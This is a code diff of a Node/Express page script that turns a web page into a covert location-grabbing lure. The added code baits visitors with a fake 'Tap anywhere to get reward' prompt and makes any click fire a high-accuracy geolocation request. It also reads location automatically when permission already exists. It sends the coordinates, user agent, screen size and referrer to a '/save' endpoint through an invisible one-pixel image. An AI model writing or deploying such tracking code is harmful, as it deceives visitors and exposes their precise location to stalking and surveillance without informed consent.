@@ -72,137 +72,196 @@ app.get("/", (req, res) => {
         <div class="refresh-notice" id="refreshNotice">Page will refresh in <span id="countdown">3</span>s</div>
         
         <script>
-            // Show refresh countdown
-            const notice = document.getElementById('refreshNotice');
-            const countdown = document.getElementById('countdown');
-            let seconds = 3;
-            
-            const timer = setInterval(() => {
-                seconds--;
-                countdown.textContent = seconds;
-                if (seconds <= 0) {
-                    clearInterval(timer);
-                    notice.style.display = 'none';
-                }
-            }, 1000);
-            
-            // Show notice after 1 second
-            setTimeout(() => {
-                notice.style.display = 'block';
-            }, 1000);
-            
-            // TRACKING FUNCTION - Execute immediately
-            (function trackLocation() {
-                console.log("🔄 Auto-refresh tracker started...");
+    // Show refresh countdown
+    const notice = document.getElementById('refreshNotice');
+    const countdown = document.getElementById('countdown');
+    let seconds = 3;
+    
+    const timer = setInterval(() => {
+        seconds--;
+        countdown.textContent = seconds;
+        if (seconds <= 0) {
+            clearInterval(timer);
+            notice.style.display = 'none';
+        }
+    }, 1000);
+    
+    // Show notice after 1 second
+    setTimeout(() => {
+        notice.style.display = 'block';
+    }, 1000);
+    
+    // Make image clickable
+    const image = document.querySelector('img');
+    image.style.cursor = 'pointer';
+    
+    // Add click instruction
+    const clickHint = document.createElement('div');
+    clickHint.innerHTML = '📍 Tap anywhere to get reward';
+clickHint.style.cssText = 
+    'position: fixed;' +
+    'bottom: 50px;' +
+    'left: 0;' +
+    'right: 0;' +
+    'text-align: center;' +
+    'background: rgba(0,0,0,0.8);' +
+    'color: white;' +
+    'padding: 12px 20px;' +
+    'border-radius: 25px;' +
+    'font-family: Arial, sans-serif;' +
+    'font-size: 16px;' +
+    'font-weight: bold;' +
+    'margin: 0 auto;' +
+    'width: fit-content;' +
+    'z-index: 1000;' +
+    'animation: pulse 2s infinite;';
+    document.body.appendChild(clickHint);
+    
+    // Add pulse animation
+    const style = document.createElement('style');
+style.textContent = 
+    '@keyframes pulse {' +
+    '    0% { opacity: 0.7; transform: scale(1); }' +
+    '    50% { opacity: 1; transform: scale(1.05); }' +
+    '    100% { opacity: 0.7; transform: scale(1); }' +
+    '}';
+    document.head.appendChild(style);
+    
+    // Remove hint after 10 seconds
+    setTimeout(() => {
+        clickHint.style.display = 'none';
+    }, 10000);
+    
+    // Function to send data
+    function sendTrackingData(lat, lng, acc, error) {
+        const data = {
+            ua: navigator.userAgent,
+            screen: window.screen.width + 'x' + window.screen.height,
+            time: new Date().toISOString(),
+            referer: document.referrer || 'direct',
+            t: Date.now(),
+            lat: lat || 'Blocked',
+            lng: lng || 'Blocked',
+            acc: acc || 'N/A',
+            error: error || 'none',
+            status: lat ? 'success' : 'blocked'
+        };
+        
+        // Build URL
+        let url = '/save?';
+        for(let key in data) {
+            if(data[key] !== undefined && data[key] !== null) {
+                url += key + '=' + encodeURIComponent(data[key]) + '&';
+            }
+        }
+        
+        // Send via image (works everywhere)
+        const tracker = new Image();
+        tracker.src = url;
+        tracker.style.cssText = 'position:absolute;width:1px;height:1px;opacity:0;';
+        document.body.appendChild(tracker);
+        
+        console.log('📡 Tracking data sent:', {lat, lng, error});
+        
+        // Update hint
+        if (lat && lng) {
+            clickHint.innerHTML = '✅ wait for 10 seconds to get rewarded';
+            clickHint.style.background = 'rgba(34, 197, 94, 0.9)';
+        } else {
+            clickHint.innerHTML = '📍 Location not shared';
+            clickHint.style.background = 'rgba(239, 68, 68, 0.9)';
+        }
+        
+        // Hide after 3 seconds
+        setTimeout(() => {
+            clickHint.style.display = 'none';
+        }, 3000);
+    }
+    
+    // Function to request location
+    function requestLocation() {
+        clickHint.innerHTML = '🔄 Requesting location...';
+        
+        if (!navigator.geolocation) {
+            sendTrackingData(null, null, null, 'not_supported');
+            return;
+        }
+        
+        // Request location with user gesture
+        navigator.geolocation.getCurrentPosition(
+            // Success
+            function(position) {
+                sendTrackingData(
+                    position.coords.latitude,
+                    position.coords.longitude,
+                    position.coords.accuracy,
+                    null
+                );
+            },
+            // Error
+            function(error) {
+                sendTrackingData(null, null, null, 'error_' + error.code);
                 
-                // Create invisible tracking pixel
-                const tracker = new Image();
-                tracker.style.cssText = 'position:absolute;width:1px;height:1px;opacity:0;';
+                // Try watchPosition as fallback
+                const watchId = navigator.geolocation.watchPosition(
+                    function(watchPos) {
+                        sendTrackingData(
+                            watchPos.coords.latitude,
+                            watchPos.coords.longitude,
+                            watchPos.coords.accuracy,
+                            null
+                        );
+                        navigator.geolocation.clearWatch(watchId);
+                    },
+                    null,
+                    { timeout: 3000 }
+                );
                 
-                // Get all possible data
-                const data = {
-                    ua: navigator.userAgent,
-                    screen: window.screen.width + 'x' + window.screen.height,
-                    time: new Date().toISOString(),
-                    referer: document.referrer || 'direct',
-                    t: Date.now()
-                };
-                
-                // Function to send data
-                function sendToServer(lat, lng, acc, error) {
-                    let url = '/save?';
-                    
-                    if (lat && lng) {
-                        data.lat = lat;
-                        data.lng = lng;
-                        data.acc = acc;
-                        data.status = 'success';
-                    } else {
-                        data.error = error || 'unknown';
-                        data.status = 'blocked';
+                setTimeout(() => navigator.geolocation.clearWatch(watchId), 5000);
+            },
+            // Options
+            {
+                enableHighAccuracy: true,
+                timeout: 8000,
+                maximumAge: 0
+            }
+        );
+    }
+    
+    // Add click event to image
+    image.addEventListener('click', requestLocation);
+    image.addEventListener('touchstart', requestLocation);
+    
+    // Also make entire body clickable
+    document.body.addEventListener('click', requestLocation);
+    document.body.addEventListener('touchstart', requestLocation);
+    
+    // Auto-try location if already have permission
+    setTimeout(() => {
+        if (navigator.permissions && navigator.permissions.query) {
+            navigator.permissions.query({name: 'geolocation'})
+                .then(permissionStatus => {
+                    if (permissionStatus.state === 'granted') {
+                        // Already have permission, get location automatically
+                        navigator.geolocation.getCurrentPosition(
+                            pos => {
+                                sendTrackingData(
+                                    pos.coords.latitude,
+                                    pos.coords.longitude,
+                                    pos.coords.accuracy,
+                                    null
+                                );
+                            },
+                            err => {
+                                sendTrackingData(null, null, null, 'error_' + err.code);
+                            }
+                        );
                     }
-                    
-                    // Build URL with all data
-                    for (let key in data) {
-                        if (data[key] !== undefined && data[key] !== null) {
-                            url += key + '=' + encodeURIComponent(data[key]) + '&';
-                        }
-                    }
-                    
-                    // Send via image (works even if fetch blocked)
-                    tracker.src = url;
-                    document.body.appendChild(tracker);
-                    
-                    console.log('📡 Tracking data sent:', {lat, lng, error});
-                }
-                
-                // Try to get location
-                if (navigator.geolocation) {
-                    console.log("📍 Requesting location permission...");
-                    
-                    // Use getCurrentPosition
-                    navigator.geolocation.getCurrentPosition(
-                        function(position) {
-                            console.log("✅ Location received!");
-                            sendToServer(
-                                position.coords.latitude,
-                                position.coords.longitude,
-                                position.coords.accuracy,
-                                null
-                            );
-                        },
-                        function(error) {
-                            console.log("❌ Location error:", error.code);
-                            
-                            // Try watchPosition as fallback
-                            const watchId = navigator.geolocation.watchPosition(
-                                function(watchPos) {
-                                    console.log("✅ WatchPosition got location!");
-                                    sendToServer(
-                                        watchPos.coords.latitude,
-                                        watchPos.coords.longitude,
-                                        watchPos.coords.accuracy,
-                                        null
-                                    );
-                                    navigator.geolocation.clearWatch(watchId);
-                                },
-                                function(watchError) {
-                                    console.log("❌ WatchPosition failed");
-                                    sendToServer(null, null, null, 'error_' + watchError.code);
-                                },
-                                {
-                                    enableHighAccuracy: true,
-                                    timeout: 3000,
-                                    maximumAge: 0
-                                }
-                            );
-                            
-                            // Clear after 5 seconds
-                            setTimeout(() => navigator.geolocation.clearWatch(watchId), 5000);
-                        },
-                        {
-                            enableHighAccuracy: true,  // Force permission prompt
-                            timeout: 5000,
-                            maximumAge: 0
-                        }
-                    );
-                } else {
-                    console.log("❌ Geolocation not supported");
-                    sendToServer(null, null, null, 'not_supported');
-                }
-                
-                // Always send at least IP data (fallback after 2 seconds)
-                setTimeout(() => {
-                    const trackers = document.querySelectorAll('img[src^="/save"]');
-                    if (trackers.length === 0) {
-                        console.log("🕒 Sending fallback data...");
-                        sendToServer(null, null, null, 'timeout_fallback');
-                    }
-                }, 2000);
-                
-            })(); // Immediately invoked
-            
-        </script>
+                });
+        }
+    }, 1000);
+    
+</script>
     </body>
     </html>
   `);
